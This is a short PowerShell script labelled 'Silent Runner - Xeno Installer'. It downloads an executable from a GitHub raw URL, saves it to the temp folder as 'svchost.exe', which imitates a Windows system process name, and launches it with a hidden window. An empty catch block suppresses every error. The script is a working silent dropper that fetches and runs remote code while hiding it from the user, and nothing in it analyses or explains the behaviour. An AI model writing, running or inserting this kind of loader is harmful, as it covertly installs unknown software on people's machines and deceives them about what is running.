# Silent Runner - Xeno Installer
$payloadUrl = "https://github.com/hypnotixx0/xenolord/raw/main/svchost.exe"
$payloadPath = "$env:TEMP\svchost.exe"

try {
    Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing
    Start-Process -FilePath $payloadPath -WindowStyle Hidden
} catch {}
